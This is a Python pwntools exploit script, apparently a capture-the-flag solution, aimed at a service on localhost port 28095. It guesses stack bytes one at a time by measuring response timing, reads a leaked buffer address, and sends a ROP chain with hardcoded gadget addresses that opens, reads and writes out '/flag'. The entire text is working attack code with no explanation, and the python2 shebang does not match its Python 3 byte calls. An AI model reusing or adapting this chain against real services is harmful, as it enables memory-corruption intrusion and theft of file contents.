#!/usr/bin/env python2

import os
import re
import sys
import time

from pwn import *

context.arch = "amd64"
context.log_level ='error'
context.os = "linux"


host = 'localhost'
port = 28095

base_payload = b'/flag\x00'+ b'A'*34+ b'\x00'

for i in range(0, 7):
    bestTime = 0
    bestValue = -1
    for j in range(0, 256):
       p = remote(host, port)
       payload = base_payload + j.to_bytes(1, 'little')
       sendTime = time.time()
       p.send(payload)
       p.recvuntil(b"feedback\n")
       timeDiff = time.time() - sendTime
       if(timeDiff > bestTime):
           bestTime = timeDiff
           bestValue = j
       p.close()
    base_payload += bestValue.to_bytes(1, 'little')

print(base_payload)

p = remote(host, port)
p.recvuntil(b'Hint:')
buffer_address = int(p.recvline()[-13:-1], 16)
print(hex(buffer_address))
p.close()

#buffer_address = 0x7ffee40577a0

pop_rdi = 0x000000000040152f
pop_rdx = 0x000000000040152b
pop_rsi_r15 = 0x000000000040152d
mov_rdi_rax = 0x0000000000401533

write_address = 0x401040
open_address = 0x00000000004010f0
read_address = 0x00000000004010a0

payload  = base_payload + b'B'*8

#open
payload += p64(pop_rdi)
payload += p64(buffer_address)
payload += p64(pop_rsi_r15)
payload += p64(0)
payload += p64(0)
payload += p64(open_address)

#move fd
payload += p64(mov_rdi_rax)

#read
payload += p64(pop_rsi_r15)
payload += p64(buffer_address)
payload += p64(0)
payload += p64(pop_rdx)
payload += p64(40)
payload += p64(read_address)

#Write
payload += p64(pop_rdi)
payload += p64(4)
payload += p64(pop_rsi_r15)
payload += p64(buffer_address)
payload += p64(0)
payload += p64(pop_rdx)
payload += p64(40)
payload += p64(write_address)


p = remote(host, port)
p.send(payload)
p.interactive()
